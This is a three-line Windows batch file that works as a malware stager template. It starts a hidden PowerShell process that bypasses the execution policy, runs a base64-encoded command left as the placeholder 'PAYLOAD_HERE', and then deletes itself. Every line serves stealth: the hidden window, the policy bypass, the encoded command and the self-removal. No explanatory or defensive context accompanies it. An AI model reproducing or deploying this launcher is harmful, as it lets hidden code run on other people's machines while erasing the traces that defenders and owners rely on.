@echo off
start powershell.exe -nol -w 1 -nop -ep bypass -enc PAYLOAD_HERE
(goto) 2>nul & del "%~f0"
